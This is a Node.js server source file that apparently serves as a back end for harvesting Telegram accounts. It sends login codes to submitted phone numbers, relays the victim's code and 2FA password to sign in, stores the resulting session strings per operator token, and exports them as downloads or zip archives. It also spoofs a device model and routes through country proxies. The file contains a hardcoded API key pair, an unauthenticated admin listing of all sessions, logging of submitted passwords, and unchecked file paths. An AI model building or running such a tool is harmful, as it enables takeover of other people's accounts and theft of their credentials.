const express = require('express');
const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const bodyParser = require('body-parser');
const archiver = require('archiver');
const morgan = require('morgan');
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

// ===================== CONFIGURATION =====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_ID: 29176644,
    API_HASH: "779da7ab84c393d0bec09d1be3918dec",
    BASE_DIR: path.join(__dirname, "sessionStore"),
    USERS_FILE: path.join(__dirname, 'data', 'users.json'),
    PROXIES_FILE: path.join(__dirname, 'data', 'proxies.json'),
    LOGS_DIR: path.join(__dirname, 'logs'),
    MAX_FILE_SIZE: '10mb',
    SESSION_TIMEOUT: 180000, // 3 minutes
    CONNECTION_TIMEOUT: 60000, // 1 minute
    RATE_LIMIT_WINDOW: 15 * 60 * 1000, // 15 minutes
    RATE_LIMIT_MAX: 100 // requests per window
};

// ===================== INITIALIZATION =====================
const app = express();

// Create necessary directories
[CONFIG.BASE_DIR, CONFIG.LOGS_DIR, path.dirname(CONFIG.USERS_FILE)].forEach(dir => {
    if (!fsSync.existsSync(dir)) {
        fsSync.mkdirSync(dir, { recursive: true });
    }
});

// ===================== MIDDLEWARE =====================
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"]
        }
    },
    crossOriginResourcePolicy: { policy: "cross-origin" }
}));

app.use(cors({
    origin: process.env.NODE_ENV === 'production' ? [/\.yourdomain\.com$/] : '*',
    credentials: true
}));

app.use(morgan('combined', {
    stream: fsSync.createWriteStream(path.join(CONFIG.LOGS_DIR, 'access.log'), { flags: 'a' })
}));

app.use(bodyParser.json({ limit: CONFIG.MAX_FILE_SIZE }));
app.use(bodyParser.urlencoded({ extended: true, limit: CONFIG.MAX_FILE_SIZE }));

// Rate limiting
const limiter = rateLimit({
    windowMs: CONFIG.RATE_LIMIT_WINDOW,
    max: CONFIG.RATE_LIMIT_MAX,
    message: { ok: false, error: 'Too many requests, please try again later.' },
    standardHeaders: true,
    legacyHeaders: false
});
app.use('/api/', limiter);

// Static files
app.use(express.static('public', {
    maxAge: '1d',
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-cache');
        }
    }
}));

// ===================== UTILITY FUNCTIONS =====================

class Logger {
    static log(level, message, data = {}) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${level.toUpperCase()}] ${message} ${Object.keys(data).length ? JSON.stringify(data) : ''}`;
        
        console.log(logMessage);
        
        // Write to file
        const logFile = path.join(CONFIG.LOGS_DIR, `${level}.log`);
        fsSync.appendFileSync(logFile, logMessage + '\n', 'utf8');
    }

    static info(message, data) { this.log('info', message, data); }
    static error(message, data) { this.log('error', message, data); }
    static warn(message, data) { this.log('warn', message, data); }
    static debug(message, data) { this.log('debug', message, data); }
}

class CacheManager {
    constructor() {
        this.cache = new Map();
        this.ttl = new Map();
    }

    set(key, value, ttl = 300000) { // 5 minutes default
        this.cache.set(key, value);
        this.ttl.set(key, Date.now() + ttl);
        return value;
    }

    get(key) {
        if (!this.cache.has(key)) return null;
        
        const expiry = this.ttl.get(key);
        if (expiry && Date.now() > expiry) {
            this.delete(key);
            return null;
        }
        
        return this.cache.get(key);
    }

    delete(key) {
        this.cache.delete(key);
        this.ttl.delete(key);
    }

    clear() {
        this.cache.clear();
        this.ttl.clear();
    }
}

const cache = new CacheManager();

// ===================== DATA MANAGERS =====================

class UserManager {
    static async loadUsers() {
        try {
            if (!fsSync.existsSync(CONFIG.USERS_FILE)) {
                return [];
            }
            const data = await fs.readFile(CONFIG.USERS_FILE, 'utf8');
            return JSON.parse(data) || [];
        } catch (error) {
            Logger.error('Failed to load users', { error: error.message });
            return [];
        }
    }

    static async saveUsers(users) {
        try {
            await fs.writeFile(CONFIG.USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
            return true;
        } catch (error) {
            Logger.error('Failed to save users', { error: error.message });
            return false;
        }
    }

    static async createUser(username, token) {
        if (!username || !token) {
            throw new Error('Username and token are required');
        }

        const users = await this.loadUsers();
        
        // Check if username exists
        if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) {
            throw new Error('Username already exists');
        }

        // Check if token exists
        if (users.some(u => u.token === token)) {
            throw new Error('Token already in use');
        }

        const newUser = {
            username,
            token,
            id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            createdAt: new Date().toISOString(),
            lastActive: new Date().toISOString(),
            status: 'active',
            sessions: 0
        };

        users.push(newUser);
        
        if (await this.saveUsers(users)) {
            Logger.info('User created', { username, token });
            return newUser;
        }
        
        throw new Error('Failed to save user');
    }

    static async updateUser(username, updates) {
        const users = await this.loadUsers();
        const index = users.findIndex(u => u.username.toLowerCase() === username.toLowerCase());
        
        if (index === -1) {
            throw new Error('User not found');
        }

        users[index] = { ...users[index], ...updates, lastActive: new Date().toISOString() };
        
        if (await this.saveUsers(users)) {
            Logger.info('User updated', { username, updates });
            return users[index];
        }
        
        throw new Error('Failed to update user');
    }

    static async getUserByToken(token) {
        const users = await this.loadUsers();
        return users.find(u => u.token === token) || null;
    }
}

class ProxyManager {
    static async loadProxies() {
        const cacheKey = 'proxies';
        const cached = cache.get(cacheKey);
        if (cached) return cached;

        try {
            if (!fsSync.existsSync(CONFIG.PROXIES_FILE)) {
                // Return default proxies if file doesn't exist
                const defaultProxies = {
                    metadata: { lastUpdated: new Date().toISOString(), version: '1.0' },
                    proxies: {}
                };
                cache.set(cacheKey, defaultProxies, 60000); // Cache for 1 minute
                return defaultProxies;
            }

            const data = await fs.readFile(CONFIG.PROXIES_FILE, 'utf8');
            const proxies = JSON.parse(data);
            cache.set(cacheKey, proxies, 60000); // Cache for 1 minute
            return proxies;
        } catch (error) {
            Logger.error('Failed to load proxies', { error: error.message });
            return { metadata: {}, proxies: {} };
        }
    }

    static getCountryCodeFromNumber(number) {
        const countryCodes = {
            '880': 'BD', // Bangladesh
            '91': 'IN',  // India
            '1': 'US',   // United States
            '31': 'NL',  // Netherlands
            '34': 'ES',  // Spain
            '27': 'SA',  // Saudi Arabia
            '44': 'GB',  // United Kingdom
            '49': 'DE',  // Germany
            '33': 'FR',  // France
            '39': 'IT',  // Italy
            '81': 'JP',  // Japan
            '82': 'KR',  // South Korea
            '86': 'CN',  // China
            '7': 'RU',   // Russia
            '61': 'AU',  // Australia
            '55': 'BR'   // Brazil
        };

        const match = number.match(/^\+?(\d{1,3})/);
        return match ? countryCodes[match[1]] || null : null;
    }

    static async getProxyForNumber(phoneNumber) {
        const proxiesData = await this.loadProxies();
        const countryCode = this.getCountryCodeFromNumber(phoneNumber);
        
        if (countryCode && proxiesData.proxies[countryCode]) {
            return proxiesData.proxies[countryCode];
        }
        
        return null; // No specific proxy for this country
    }
}

class SessionManager {
    static async getUserFolder(token) {
        const safeToken = token.replace(/[^a-zA-Z0-9_-]/g, "_");
        const folder = path.join(CONFIG.BASE_DIR, safeToken);
        
        if (!fsSync.existsSync(folder)) {
            await fs.mkdir(folder, { recursive: true });
            Logger.info('Created user folder', { token, folder });
        }
        
        return folder;
    }

    static async listUserSessions(token) {
        try {
            const folder = await this.getUserFolder(token);
            const files = await fs.readdir(folder);
            
            const sessions = await Promise.all(
                files
                    .filter(f => f.endsWith('.txt'))
                    .map(async f => {
                        const filePath = path.join(folder, f);
                        const stats = await fs.stat(filePath);
                        const timestamp = parseInt(f.match(/\d+/)?.[0] || Date.now());
                        
                        return {
                            name: f,
                            size: stats.size,
                            created: new Date(stats.birthtime).toISOString(),
                            modified: new Date(stats.mtime).toISOString(),
                            timestamp,
                            readableSize: this.formatBytes(stats.size)
                        };
                    })
            );

            // Sort by creation date (newest first)
            return sessions.sort((a, b) => b.timestamp - a.timestamp);
        } catch (error) {
            Logger.error('Failed to list sessions', { token, error: error.message });
            return [];
        }
    }

    static async getAllSessions() {
        try {
            const folders = await fs.readdir(CONFIG.BASE_DIR);
            const allSessions = [];

            for (const userFolder of folders) {
                const folderPath = path.join(CONFIG.BASE_DIR, userFolder);
                const stats = await fs.stat(folderPath);
                
                if (stats.isDirectory()) {
                    const sessions = await this.listUserSessions(userFolder);
                    allSessions.push({
                        user: userFolder,
                        folder: userFolder,
                        sessionCount: sessions.length,
                        lastModified: new Date(stats.mtime).toISOString(),
                        sessions: sessions.slice(0, 10) // Limit to 10 recent sessions
                    });
                }
            }

            return allSessions.sort((a, b) => new Date(b.lastModified) - new Date(a.lastModified));
        } catch (error) {
            Logger.error('Failed to get all sessions', { error: error.message });
            return [];
        }
    }

    static async createSessionFile(token, sessionData) {
        const folder = await this.getUserFolder(token);
        const fileName = `session_${Date.now()}.txt`;
        const filePath = path.join(folder, fileName);
        
        await fs.writeFile(filePath, sessionData, 'utf8');
        Logger.info('Session file created', { token, fileName });
        
        return { fileName, filePath };
    }

    static formatBytes(bytes, decimals = 2) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    }
}

// ===================== TEMPORARY SESSION STORE =====================
class TempSessionStore {
    constructor() {
        this.store = new Map();
        this.cleanupInterval = setInterval(() => this.cleanup(), 60000); // Clean every minute
    }

    set(phone, data) {
        this.store.set(phone, {
            ...data,
            createdAt: Date.now(),
            expiresAt: Date.now() + CONFIG.SESSION_TIMEOUT
        });
        Logger.debug('Temp session stored', { phone });
    }

    get(phone) {
        const data = this.store.get(phone);
        if (!data) return null;
        
        if (Date.now() > data.expiresAt) {
            this.delete(phone);
            return null;
        }
        
        return data;
    }

    delete(phone) {
        const data = this.store.get(phone);
        if (data && data.client) {
            try {
                data.client.disconnect();
                Logger.debug('Client disconnected during cleanup', { phone });
            } catch (error) {
                // Ignore disconnect errors
            }
        }
        this.store.delete(phone);
        Logger.debug('Temp session deleted', { phone });
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        
        for (const [phone, data] of this.store.entries()) {
            if (now > data.expiresAt) {
                this.delete(phone);
                cleaned++;
            }
        }
        
        if (cleaned > 0) {
            Logger.info('Temp session cleanup completed', { cleaned });
        }
    }

    destroy() {
        clearInterval(this.cleanupInterval);
        for (const [phone] of this.store.entries()) {
            this.delete(phone);
        }
        this.store.clear();
    }
}

const tempSessions = new TempSessionStore();

// ===================== TELEGRAM CLIENT MANAGER =====================
class TelegramClientManager {
    static async createClient(phoneNumber, proxyConfig = null) {
        const session = new StringSession("");
        
        const connectionParams = {
            connectionRetries: 5,
            timeout: CONFIG.CONNECTION_TIMEOUT,
            deviceModel: "Samsung Galaxy S23",
            systemVersion: "Android 13",
            appVersion: "12.2.10",
            langCode: "en",
            ...(proxyConfig && { proxy: proxyConfig })
        };

        const client = new TelegramClient(session, CONFIG.API_ID, CONFIG.API_HASH, connectionParams);
        
        // Suppress logs
        client.setLogLevel("none");
        
        // Custom error handling
        client.addEventHandler((update) => {
            // Handle updates if needed
        });

        try {
            await client.connect();
            Logger.info('Telegram client connected', { phoneNumber });
            return client;
        } catch (error) {
            Logger.error('Failed to connect Telegram client', { phoneNumber, error: error.message });
            throw error;
        }
    }

    static async sendOtp(phoneNumber) {
        try {
            // Get appropriate proxy for the phone number
            const proxyConfig = await ProxyManager.getProxyForNumber(phoneNumber);
            const client = await this.createClient(phoneNumber, proxyConfig);
            
            const sent = await client.invoke(
                new Api.auth.SendCode({
                    phoneNumber,
                    apiId: CONFIG.API_ID,
                    apiHash: CONFIG.API_HASH,
                    settings: new Api.CodeSettings({
                        allow_flashcall: false,
                        current_number: false,
                        allow_app_hash: true,
                    }),
                })
            );

            const session = client.session;
            
            // Store in temp sessions
            tempSessions.set(phoneNumber, {
                client,
                session,
                hash: sent.phoneCodeHash,
                proxyUsed: !!proxyConfig
            });

            // Auto disconnect after timeout
            setTimeout(() => {
                try {
                    if (client.connected) {
                        client.disconnect();
                        Logger.debug('Client auto-disconnected', { phoneNumber });
                    }
                } catch (error) {
                    // Ignore disconnect errors
                }
            }, CONFIG.SESSION_TIMEOUT);

            Logger.info('OTP sent successfully', { phoneNumber });
            return { ok: true, phoneCodeHash: sent.phoneCodeHash };
            
        } catch (error) {
            Logger.error('Failed to send OTP', { phoneNumber, error: error.message });
            
            // Check for specific error types
            if (error.message.includes('PHONE_NUMBER_INVALID')) {
                throw new Error('Invalid phone number format');
            } else if (error.message.includes('PHONE_NUMBER_FLOOD')) {
                throw new Error('Too many requests. Please try again later.');
            } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
                throw new Error('The code has expired');
            } else if (error.message.includes('NETWORK')) {
                throw new Error('Network error. Please check your connection.');
            }
            
            throw error;
        }
    }

    static async verifyOtp(phoneNumber, code, password = null) {
        const sessionData = tempSessions.get(phoneNumber);
        if (!sessionData) {
            throw new Error('Session expired or not found');
        }

        const { client, session, hash } = sessionData;

        try {
            let result;
            
            try {
                result = await client.invoke(
                    new Api.auth.SignIn({
                        phoneNumber,
                        phoneCode: code,
                        phoneCodeHash: hash,
                    })
                );
            } catch (error) {
                if (error.errorMessage === "SESSION_PASSWORD_NEEDED") {
                    if (!password) {
                        throw new Error('2FA_PASSWORD_REQUIRED');
                    }
                    
                    result = await client.invoke(
                        new Api.auth.CheckPassword({ password })
                    );
                } else {
                    throw error;
                }
            }

            // Clean up temp session
            tempSessions.delete(phoneNumber);
            
            // Return the session string
            const sessionString = session.save();
            Logger.info('OTP verified successfully', { phoneNumber });
            
            return {
                ok: true,
                session: sessionString,
                user: result.user
            };
            
        } catch (error) {
            Logger.error('Failed to verify OTP', { phoneNumber, error: error.message });
            
            // Clean up on error
            tempSessions.delete(phoneNumber);
            
            if (error.message.includes('PHONE_CODE_INVALID')) {
                throw new Error('Invalid verification code');
            } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
                throw new Error('The code has expired');
            } else if (error.message.includes('PASSWORD_HASH_INVALID')) {
                throw new Error('Invalid 2FA password');
            }
            
            throw error;
        }
    }
}

// ===================== API ROUTES =====================

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        ok: true,
        status: 'operational',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: '2.0.0'
    });
});

// Send OTP
app.post('/api/sendOtp', async (req, res) => {
    try {
        const { countryCode, phone, token } = req.body;
        
        // Validation
        if (!countryCode || !phone || !token) {
            return res.status(400).json({
                ok: false,
                error: 'Missing required fields: countryCode, phone, token'
            });
        }

        const fullPhoneNumber = countryCode + phone;
        
        // Validate phone number format
        if (!/^\+\d{10,15}$/.test(fullPhoneNumber)) {
            return res.status(400).json({
                ok: false,
                error: 'Invalid phone number format'
            });
        }

        // Check if user exists
        const user = await UserManager.getUserByToken(token);
        if (!user) {
            return res.status(403).json({
                ok: false,
                error: 'Invalid token'
            });
        }

        const result = await TelegramClientManager.sendOtp(fullPhoneNumber);
        
        // Update user last active
        await UserManager.updateUser(user.username, { lastActive: new Date().toISOString() });
        
        res.json(result);
        
    } catch (error) {
        Logger.error('Send OTP error', { error: error.message, body: req.body });
        
        res.status(500).json({
            ok: false,
            error: error.message || 'Failed to send OTP'
        });
    }
});

// Verify OTP
app.post('/api/verify', async (req, res) => {
    try {
        const { phone, code, password, token } = req.body;
        
        if (!phone || !code || !token) {
            return res.status(400).json({
                ok: false,
                error: 'Missing required fields: phone, code, token'
            });
        }

        // Check if user exists
        const user = await UserManager.getUserByToken(token);
        if (!user) {
            return res.status(403).json({
                ok: false,
                error: 'Invalid token'
            });
        }

        const result = await TelegramClientManager.verifyOtp(phone, code, password);
        
        if (result.ok) {
            // Save session to file
            const sessionFile = await SessionManager.createSessionFile(token, result.session);
            
            // Update user stats
            await UserManager.updateUser(user.username, {
                lastActive: new Date().toISOString(),
                sessions: (user.sessions || 0) + 1
            });

            res.json({
                ok: true,
                message: 'OTP verified successfully',
                file: sessionFile.fileName,
                user: result.user
            });
        } else {
            res.status(400).json(result);
        }
        
    } catch (error) {
        Logger.error('Verify OTP error', { error: error.message, body: req.body });
        
        res.status(500).json({
            ok: false,
            error: error.message || 'Failed to verify OTP'
        });
    }
});

// Create new user
app.post('/api/users', async (req, res) => {
    try {
        const { username, token } = req.body;
        
        if (!username || !token) {
            return res.status(400).json({
                ok: false,
                error: 'Username and token are required'
            });
        }

        const user = await UserManager.createUser(username, token);
        
        res.status(201).json({
            ok: true,
            message: 'User created successfully',
            user: {
                id: user.id,
                username: user.username,
                createdAt: user.createdAt
            }
        });
        
    } catch (error) {
        Logger.error('Create user error', { error: error.message, body: req.body });
        
        res.status(400).json({
            ok: false,
            error: error.message
        });
    }
});

// Get user sessions
app.get('/api/sessions', async (req, res) => {
    try {
        const { token } = req.query;
        
        if (!token) {
            return res.status(400).json({
                ok: false,
                error: 'Token is required'
            });
        }

        const sessions = await SessionManager.listUserSessions(token);
        
        res.json({
            ok: true,
            count: sessions.length,
            sessions
        });
        
    } catch (error) {
        Logger.error('Get sessions error', { error: error.message, query: req.query });
        
        res.status(500).json({
            ok: false,
            error: 'Failed to retrieve sessions'
        });
    }
});

// Get all sessions (admin only)
app.get('/api/admin/sessions', async (req, res) => {
    try {
        // Add admin authentication here if needed
        const sessions = await SessionManager.getAllSessions();
        
        res.json({
            ok: true,
            count: sessions.length,
            sessions
        });
        
    } catch (error) {
        Logger.error('Get all sessions error', { error: error.message });
        
        res.status(500).json({
            ok: false,
            error: 'Failed to retrieve all sessions'
        });
    }
});

// Download session file
app.get('/api/download/:filename', async (req, res) => {
    try {
        const { token } = req.query;
        const { filename } = req.params;
        
        if (!token) {
            return res.status(400).json({
                ok: false,
                error: 'Token is required'
            });
        }

        const folder = await SessionManager.getUserFolder(token);
        const filePath = path.join(folder, filename);
        
        if (!fsSync.existsSync(filePath)) {
            return res.status(404).json({
                ok: false,
                error: 'File not found'
            });
        }

        res.download(filePath, filename);
        
    } catch (error) {
        Logger.error('Download error', { error: error.message, params: req.params });
        
        res.status(500).json({
            ok: false,
            error: 'Failed to download file'
        });
    }
});

// Zip multiple sessions
app.post('/api/zip', async (req, res) => {
    try {
        const { token, files } = req.body;
        
        if (!token || !files || !Array.isArray(files) || files.length === 0) {
            return res.status(400).json({
                ok: false,
                error: 'Token and files array are required'
            });
        }

        if (files.length > 50) {
            return res.status(400).json({
                ok: false,
                error: 'Maximum 50 files allowed per zip'
            });
        }

        const folder = await SessionManager.getUserFolder(token);
        const zipName = `sessions_${Date.now()}.zip`;
        
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename="${zipName}"`);
        
        const archive = archiver('zip', {
            zlib: { level: 9 }
        });
        
        archive.on('error', (err) => {
            Logger.error('Archive error', { error: err.message });
            res.status(500).end();
        });
        
        archive.pipe(res);
        
        // Add files to archive
        for (const file of files) {
            const filePath = path.join(folder, file);
            if (fsSync.existsSync(filePath)) {
                archive.file(filePath, { name: file });
            }
        }
        
        await archive.finalize();
        Logger.info('Zip created', { token, fileCount: files.length });
        
    } catch (error) {
        Logger.error('Zip error', { error: error.message, body: req.body });
        
        res.status(500).json({
            ok: false,
            error: 'Failed to create zip file'
        });
    }
});

// Get proxy list
app.get('/api/proxies', async (req, res) => {
    try {
        const proxies = await ProxyManager.loadProxies();
        
        res.json({
            ok: true,
            ...proxies
        });
        
    } catch (error) {
        Logger.error('Get proxies error', { error: error.message });
        
        res.status(500).json({
            ok: false,
            error: 'Failed to load proxies'
        });
    }
});

// ===================== ERROR HANDLING =====================

// 404 handler
app.use((req, res) => {
    res.status(404).json({
        ok: false,
        error: 'Endpoint not found',
        path: req.path,
        method: req.method
    });
});

// Global error handler
app.use((error, req, res, next) => {
    Logger.error('Unhandled error', {
        error: error.message,
        stack: error.stack,
        path: req.path,
        method: req.method
    });
    
    res.status(500).json({
        ok: false,
        error: process.env.NODE_ENV === 'production' ? 'Internal server error' : error.message
    });
});

// ===================== STARTUP =====================

// Import and start bot
let bot;
try {
    bot = require('./bot');
    Logger.info('Telegram bot loaded successfully');
} catch (error) {
    Logger.warn('Failed to load Telegram bot', { error: error.message });
}

// Graceful shutdown
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

function gracefulShutdown() {
    Logger.info('Shutting down gracefully...');
    
    // Clean up temp sessions
    tempSessions.destroy();
    
    // Close server
    server.close(() => {
        Logger.info('Server closed');
        process.exit(0);
    });
    
    // Force close after 10 seconds
    setTimeout(() => {
        Logger.error('Force shutdown');
        process.exit(1);
    }, 10000);
}

// Start server
const server = app.listen(CONFIG.PORT, () => {
    Logger.info(`Server running → http://localhost:${CONFIG.PORT}`);
    Logger.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
    Logger.info(`Session directory: ${CONFIG.BASE_DIR}`);
});

// Export for testing
module.exports = { app, server };
